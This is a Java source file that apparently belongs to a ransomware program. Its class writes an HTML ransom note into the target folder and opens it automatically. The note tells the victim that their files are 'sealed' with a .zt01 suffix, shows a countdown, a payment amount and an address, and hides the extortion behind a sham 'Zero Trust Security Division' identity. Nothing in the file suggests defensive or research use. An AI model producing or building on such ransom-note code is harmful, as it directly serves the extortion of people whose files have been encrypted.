package com.ztsec.ghost;

import java.awt.Desktop;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;

/** Drops the human-readable notice into the root and opens it. */
public final class NoticeFile {
    public static final String NAME = "ZT-01_NOTICE.html";

    private NoticeFile() { }

    public static Path write(Path root, String caseId, int fileCount, long bytes,
                             Duration remaining, String price, String address) throws IOException {
        String body = """
                <!doctype html>
                <html lang="en"><head><meta charset="utf-8"><title>ZT-01 // %s</title>
                <style>
                  body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0b0d10;
                       color:#d7dbe0;font:15px/1.6 ui-monospace,Consolas,monospace}
                  main{max-width:640px;padding:40px;border:1px solid #232a33;border-radius:6px;background:#0f1216}
                  h1{margin:0 0 4px;font-size:13px;letter-spacing:.28em;color:#E23A3A;text-transform:uppercase}
                  h2{margin:0 0 24px;font-size:22px}
                  dl{display:grid;grid-template-columns:auto 1fr;gap:8px 20px;margin:0 0 24px;font-size:13px}
                  dt{color:#7d8894;font-size:11px;letter-spacing:.1em;text-transform:uppercase;padding-top:3px}
                  dd{margin:0}
                  .big{font-size:26px;color:#E23A3A}
                  code{background:#171c22;padding:2px 6px;border-radius:3px;font-size:12px;word-break:break-all}
                  footer{color:#6d7883;font-size:11.5px;border-top:1px solid #232a33;padding-top:14px}
                </style></head><body><main>
                  <h1>Project ZT-01 · Zero Trust Security Division</h1>
                  <h2>Files on this device are sealed.</h2>
                  <dl>
                    <dt>Case</dt><dd><code>%s</code></dd>
                    <dt>Files</dt><dd>%d</dd>
                    <dt>Volume</dt><dd>%.1f MB</dd>
                    <dt>Window</dt><dd class="big">%s</dd>
                    <dt>Amount</dt><dd>%s</dd>
                    <dt>Address</dt><dd><code>%s</code></dd>
                  </dl>
                  <p>Each sealed file carries a .zt01 suffix and an authenticated header holding its
                  original name. The master recovery code restores them offline.</p>
                  <footer>The recovery code is shown once at seal time. Store it off this machine.</footer>
                </main></body></html>
                """.formatted(caseId, caseId, fileCount, bytes / 1_048_576.0,
                Countdown.format(remaining), price, address);

        Path notice = root.resolve(NAME);
        Files.writeString(notice, body, StandardCharsets.UTF_8);
        open(notice);
        return notice;
    }

    public static void open(Path file) {
        try {
            if (Desktop.isDesktopSupported()) Desktop.getDesktop().browse(file.toUri());
        } catch (IOException | UnsupportedOperationException ignored) {
            // the caller still has the path
        }
    }
}
